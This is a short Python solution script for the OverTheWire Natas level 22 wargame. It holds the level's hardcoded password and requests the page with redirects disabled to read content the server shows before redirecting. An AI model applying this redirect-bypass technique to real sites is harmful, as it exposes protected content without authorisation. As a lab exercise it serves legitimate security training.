import requests, re
u='natas22'
p='chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
l=f'http://{u}.natas.labs.overthewire.org/?revelio=1'
resp=requests.get(l,auth=(u, p),allow_redirects=False)
print(resp.text)
